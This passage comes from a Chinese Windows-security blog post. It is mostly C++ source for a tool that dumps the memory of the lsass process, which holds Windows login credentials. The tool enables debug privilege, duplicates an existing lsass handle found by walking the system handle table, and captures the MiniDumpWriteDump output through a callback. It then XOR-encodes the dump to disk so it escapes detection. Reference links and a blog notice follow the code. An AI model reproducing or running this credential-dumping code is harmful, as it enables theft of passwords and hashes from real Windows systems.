success\r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;SedebugPrivilege failed\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	DWORD pid = <span class="built_in">FindProcHandle</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL CALLBACK <span class="title">minidumpCallback</span><span class="params">(__in PVOID callbackParam,__in <span class="keyword">const</span> PMINIDUMP_CALLBACK_INPUT callbackInput,__inout PMINIDUMP_CALLBACK_OUTPUT callbackOutput)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LPVOID Destination=<span class="number">0</span>, Source=<span class="number">0</span>;</span><br><span class="line">	DWORD bufferSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (callbackInput-&gt;CallbackType)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="comment">//Triggering Write CallbackFunc</span></span><br><span class="line">	<span class="keyword">case</span> IoStartCallback:</span><br><span class="line">		callbackOutput-&gt;Status = S_FALSE;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> IoWriteAllCallback:</span><br><span class="line">		callbackOutput-&gt;Status = S_OK;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//抓取触发回调后 读取lsass 要被dump的内存内容</span></span><br><span class="line">		Source = callbackInput-&gt;Io.Buffer;</span><br><span class="line">		<span class="comment">//计算存储这部分内容的位置  堆的基地址+lsass转储内存内容的开始偏移</span></span><br><span class="line">		Destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput-&gt;Io.Offset);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//上面被读取的小块内容的大小</span></span><br><span class="line">		bufferSize = callbackInput-&gt;Io.BufferBytes;</span><br><span class="line">		bytesRead += bufferSize;</span><br><span class="line">		<span class="comment">//向堆中写入lsass的小块内容</span></span><br><span class="line">		<span class="built_in">RtlCopyMemory</span>(Destination, Source, bufferSize);</span><br><span class="line">		<span class="comment">//printf(&quot;[+]Minidump offset %x,content length:%x\r\n&quot;, callbackInput-&gt;Io.Offset, callbackInput-&gt;Io.BufferBytes);</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] Io.Offset %x\r\n&quot;</span>, callbackInput-&gt;Io.Offset);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> IoFinishCallback:</span><br><span class="line">		callbackOutput-&gt;Status = S_OK;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">EnableSeDebugPrivilege</span><span class="params">(BOOL fEnable, HANDLE&amp; hToken)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	BOOL fok = FALSE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		TOKEN_PRIVILEGES tp;<span class="comment">//结构体，表示令牌权限</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//只启动调试权限，所以权限的个数是一个</span></span><br><span class="line">		tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//下面一句话，在tp.Privilege[0].Attributes属性中，设置是开启这个权限还是关闭这个权限</span></span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in"><span class="keyword">sizeof</span></span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		fok = (<span class="built_in">GetLastError</span>() == ERROR_SUCCESS);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fok;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">FindProcHandle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hProcess=<span class="literal">NULL</span>, Duplitehandle=<span class="literal">NULL</span>,targetHandle=<span class="literal">NULL</span>;</span><br><span class="line">	HMODULE hModule = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	PVOID SysInfo;</span><br><span class="line">	PSYSTEM_HANDLE_INFORMATION HandleInfo=<span class="literal">nullptr</span>;</span><br><span class="line">	SYSTEM_HANDLE sysHandle;</span><br><span class="line">	POBJECT_TYPE_INFORMATION objectTypeInfo=<span class="literal">nullptr</span>;</span><br><span class="line">	ULONG ReturnLength=<span class="number">0</span>;</span><br><span class="line">	DWORD index = <span class="number">1</span>,ProcessID=<span class="number">0</span>;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line"></span><br><span class="line">	pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NtQuerySystemInformation) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NtQuerySystemInformation get address failed %d\r\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	pNtDuplicateObject NtDuplicateObject = (pNtDuplicateObject)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;NtDuplicateObject&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NtDuplicateObject) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NtDumplicateObject get address failed %d\r\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	pNtQueryObject NtQueryObject = (pNtQueryObject)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;NtQueryObject&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NtQueryObject) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NtQueryObject get address failed %d\r\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//get processinformation</span></span><br><span class="line">	<span class="comment">//HandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(0x10000);</span></span><br><span class="line">	<span class="keyword">while</span> ((status = <span class="built_in">NtQuerySystemInformation</span>(</span><br><span class="line">		SystemHandleInformation,</span><br><span class="line">		HandleInfo,</span><br><span class="line">		ReturnLength,</span><br><span class="line">		&amp;ReturnLength</span><br><span class="line">	)) == STATUS_INFO_LENGTH_MISMATCH)</span><br><span class="line">		HandleInfo = (PSYSTEM_HANDLE_INFORMATION)<span class="built_in">realloc</span>(HandleInfo, ReturnLength *= <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NtQuerySystemInformation Failed:%u\r\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (; index &lt; HandleInfo-&gt;HandleCount; index++) &#123;</span><br><span class="line">		<span class="comment">//printf(&quot;Handle ProcessId:%d\r\n&quot;, HandleInfo-&gt;Handles[index].ProcessId);</span></span><br><span class="line">		<span class="keyword">if</span> (HandleInfo-&gt;Handles[index].ProcessId == <span class="number">4</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		sysHandle = HandleInfo-&gt;Handles[index];</span><br><span class="line">		hProcess = <span class="built_in">OpenProcess</span>(PROCESS_DUP_HANDLE|PROCESS_QUERY_LIMITED_INFORMATION, <span class="literal">false</span>, sysHandle.ProcessId);</span><br><span class="line">		<span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//try to copy handle</span></span><br><span class="line">		status = <span class="built_in">NtDuplicateObject</span>(hProcess, (<span class="keyword">void</span>*)sysHandle.Handle,<span class="built_in">GetCurrentProcess</span>(), &amp;Duplitehandle, PROCESS_VM_READ|PROCESS_QUERY_INFORMATION, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ReturnLength = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> ((status = <span class="built_in">NtQueryObject</span>(</span><br><span class="line">			Duplitehandle,</span><br><span class="line">			ObjectTypeInformation,</span><br><span class="line">			objectTypeInfo,</span><br><span class="line">			ReturnLength,</span><br><span class="line">			&amp;ReturnLength)) == STATUS_INFO_LENGTH_MISMATCH) &#123;</span><br><span class="line">			objectTypeInfo = (POBJECT_TYPE_INFORMATION)<span class="built_in">realloc</span>(objectTypeInfo, ReturnLength * <span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!objectTypeInfo) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;could nt get the handle information %d\r\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">wchar_t</span> path[<span class="number">255</span>];</span><br><span class="line"> </span><br><span class="line">		DWORD buffSize = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">wcscmp</span>(<span class="string">L&quot;Process&quot;</span>, objectTypeInfo-&gt;TypeName.Buffer) == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="comment">//查找进程名等信息</span></span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">QueryFullProcessImageName</span>(Duplitehandle, <span class="number">0</span>, path, &amp;buffSize)) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;QueryFullProcessImagenameW Failed,ErrorCode:%d\r\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">wcsstr</span>(path,<span class="string">L&quot;lsass&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;[+] Found the Process Handle ,%d\r\n&quot;</span>, sysHandle.ProcessId);</span><br><span class="line">					targetHandle = Duplitehandle;</span><br><span class="line">					ProcessID = sysHandle.ProcessId;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//try to get the  process dump file </span></span><br><span class="line">	HANDLE hFile = <span class="built_in">CreateFile</span>(<span class="string">L&quot;C:\\users\\86156\\desktop\\mini.dmp&quot;</span>, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!hFile) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateFile ErrorCode:%u\r\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">;	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Set up minidump callback</span></span><br><span class="line">	MINIDUMP_CALLBACK_INFORMATION callbackInfo;</span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;callbackInfo, <span class="built_in"><span class="keyword">sizeof</span></span>(MINIDUMP_CALLBACK_INFORMATION));</span><br><span class="line">	callbackInfo.CallbackRoutine = &amp;minidumpCallback;</span><br><span class="line">	callbackInfo.CallbackParam = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	boolean isDumped =  <span class="built_in">MiniDumpWriteDump</span>(targetHandle, ProcessID, <span class="literal">NULL</span>, MiniDumpWithFullMemory, <span class="literal">NULL</span>, <span class="literal">NULL</span>,&amp;callbackInfo );</span><br><span class="line">	<span class="keyword">if</span> (isDumped) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Dump Process Memory Context to heap success\r\n&quot;</span>);</span><br><span class="line">		<span class="comment">/*WriteFile(hFile, dumpBuffer, bytesRead, &amp;bytesRead, NULL); */</span></span><br><span class="line">		<span class="comment">//printf(&quot;Size = %x\r\n&quot;, *((char*)dumpBuffer+3)^&#x27;a&#x27;^&#x27;a&#x27;);</span></span><br><span class="line">		DWORD strLeng = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytesRead; i++) &#123;</span><br><span class="line">			<span class="keyword">char</span> str = *((<span class="keyword">char</span>*)dumpBuffer + i) ^ <span class="string">&#x27;a&#x27;</span> ;</span><br><span class="line">			LPVOID lpStr = &amp;str;</span><br><span class="line">			<span class="built_in">WriteFile</span>(hFile, lpStr, strLeng, &amp;strLeng, <span class="literal">NULL</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">	<span class="built_in">free</span>(dumpBuffer);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(Duplitehandle);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(targetHandle);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="0x3参考文章"><a href="#0x3参考文章" class="headerlink" title="0x3参考文章"></a>0x3参考文章</h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>tttang.com/archive/<span class="number">1810</span>/<span class="comment">#toc_ntduplicateobject</span></span><br><span class="line">https:<span class="regexp">//mp</span>.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=<span class="number">2649751822</span>&amp;idx=<span class="number">3</span>&amp;sn=d8a0d685152418e7b8a6abf532365aa2&amp;chksm=<span class="number">88933161</span>bfe4b87759a0483aeb25c6bc82d098b7d98209b6cd482b3c5bd845aec349df30ae57<span class="comment">#rd</span></span><br><span class="line">https:<span class="regexp">//l</span>oong716.top/posts/lsass/</span><br></pre></td></tr></table></figure>

<h4 id="0x4-声明"><a href="#0x4-声明" class="headerlink" title="0x4 声明"></a>0x4 声明</h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">我的博客即将同步至腾讯云开发者社区，邀请大家一同入驻：https:<span class="regexp">//</span>cloud.tencent.com/developer/support-plan?invite_code=<span class="number">59</span>q74len4fdq</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Windows安全</category>
      </categories>
      <tags>
        <tag>Windows安全</tag>
      </tags>
  </entry>
</search>
